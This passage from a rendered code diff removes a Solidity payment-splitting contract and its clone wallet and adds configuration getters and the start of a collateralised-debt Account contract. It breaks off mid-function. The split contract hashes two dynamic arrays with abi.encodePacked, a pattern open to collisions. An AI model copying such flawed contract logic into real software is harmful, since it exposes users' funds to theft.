-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">tokenId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nextId</span><span class="o">++</span><span class="p">;</span>
-
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">IMPLEMENTATION</span><span class="p">).</span><span class="nx">clone</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
-
-<span class="w">        </span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span><span class="w"> </span><span class="o">=</span>
-<span class="w">            </span><span class="nx">SplitData</span><span class="p">({</span><span class="nx">hash</span><span class="o">:</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">),</span><span class="w"> </span><span class="nx">wallet</span><span class="o">:</span><span class="w"> </span><span class="nx">SplitWallet</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">wallet</span><span class="p">))});</span>
-
-<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenId</span><span class="p">);</span>
-
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">tokenId</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getAccountImplementation</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">accountImplementation</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateSplit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">external</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_updateSplit</span><span class="p">(</span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getEthUsdPriceFeed</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ethUsdPriceFeed</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateSplitAndDistribute</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_updateSplit</span><span class="p">(</span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">_distribute</span><span class="p">(</span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getCollateralRatio</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">collateralRatio</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">distribute</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_distribute</span><span class="p">(</span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getStablecoin</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">stablecoin</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">tokens</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">amounts</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
-<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amounts</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
-
-<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
-
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">                </span><span class="nx">payable</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-<span class="w">                </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">            </span><span class="p">}</span>
-<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getAccountManager</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">accountManager</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_updateSplit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">        </span><span class="kr">private</span>
-<span class="w">        </span><span class="nx">onlySplitOwner</span><span class="p">(</span><span class="nx">splitId</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">validSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">splitId</span><span class="p">].</span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isAuthorized</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">who</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_systemContracts</span><span class="p">[</span><span class="nx">who</span><span class="p">];</span>
 <span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_distribute</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">splitId</span><span class="p">].</span><span class="nx">hash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">));</span>
-
-<span class="w">        </span><span class="nx">SplitWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">splitId</span><span class="p">].</span><span class="nx">wallet</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">storedWalletBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">)][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)];</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">externalWalletBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">storedWalletBalance</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">externalWalletBalance</span><span class="p">;</span>
-
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">ownerOf</span><span class="p">(</span><span class="nx">splitId</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">relayerFee</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">SCALE</span><span class="p">;</span>
-<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="p">;</span>
-<span class="w">            </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">accounts</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">accounts</span><span class="p">[</span><span class="nx">i</span><span class="p">]][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">percents</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">SCALE</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">storedWalletBalance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">)][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">externalWalletBalance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">pullToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">externalWalletBalance</span><span class="p">);</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">internal</span>
-<span class="w">        </span><span class="nx">pure</span>
-<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">));</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">splitsById</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">id</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">SplitData</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
 <span class="p">}</span>
 </code></pre></div>
 </details>
 <details class="note">
-<summary>src/SplitWallet.sol</summary>
+<summary>src/Account.sol</summary>
 <div class="highlight"><pre><span></span><code><span class="k">import</span><span class="w"> </span><span class="s2">&quot;@clones-with-immutable-args/src/Clone.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol&quot;</span><span class="p">;</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">SplitWallet</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Clone</span><span class="w"> </span><span class="p">{</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SystemConfiguration.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./AccountManager.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Clone</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">DebtIncreased</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">DebtDecreased</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">debt</span><span class="p">;</span>
+
 <span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">pullToken</span><span class="p">(</span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">20</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ONLY_ACCOUNT_HOLDER&quot;</span><span class="p">);</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">payable</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">isHealthy</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_HEALTHY&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">ok</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">payable</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">amount</span><span class="p">}(</span><span class="nx">hex</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">ok</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TRANSFER_FAILED&quot;</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">increaseDebt</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">operator</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="p">(</span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">configuration</span><span class="p">.</span><span class="nx">isAuthorized</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_AUTHORIZED&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">operator</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">20</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ONLY_ACCOUNT_HOLDER&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">isHealthy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_HEALTHY&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">debt</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">DebtIncreased</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">decreaseDebt</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
